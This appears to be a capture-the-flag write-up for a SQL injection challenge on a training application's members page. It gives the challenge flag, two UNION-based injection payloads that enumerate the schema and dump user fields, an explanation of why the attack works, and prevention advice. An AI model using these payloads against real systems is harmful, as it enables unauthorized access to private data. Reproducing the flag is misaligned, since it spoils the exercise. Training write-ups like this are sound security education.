# Sql Injection

## Flag

```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

## Discovery and Exploitation

1. Navigate to the **MEMBERS** page.
2. To list all tables in the database, insert the following SQL query:
   ```sql
   1 AND true UNION SELECT table_name, column_name FROM information_schema.columns
   ```
3. To list all columns in the `users` table, insert the following SQL query:
   ```sql
   1 AND true UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
   ```
   > **Note:** The `CONCAT` function is used because there is a restriction that only two columns can be retrieved.
4. Follow the instructions for the user with ID 5 to obtain the flag.

## Why it works

SQL injection works by manipulating the SQL query that is executed by the application. By inserting specially crafted input, an attacker can alter the query's logic, allowing them to access or manipulate data they shouldn't be able to. In this case, the `UNION` operator is used to combine the results of the original query with the results of a malicious query, effectively bypassing the application's intended behavior and exposing sensitive information.

## Prevention

1. **Use Prepared Statements**: Use prepared statements or parameterized queries to separate SQL code from user input. This prevents attackers from injecting SQL code into the query.

2. **Input Validation**: Validate and sanitize all user inputs to prevent SQL injection attacks. Ensure that user-supplied data is properly encoded and does not contain malicious content.

3. **Least Privilege Principle**: Ensure that database users have the minimum necessary permissions to perform their tasks. Avoid using highly privileged accounts for routine operations.

4. **Database Firewall**: Implement a database firewall to monitor and block SQL injection attempts. These tools can help detect and prevent attacks in real-time.

5. **Regular Security Audits**: Regularly audit and test your application for security vulnerabilities, including SQL injection, to identify and fix potential issues before they can be exploited.
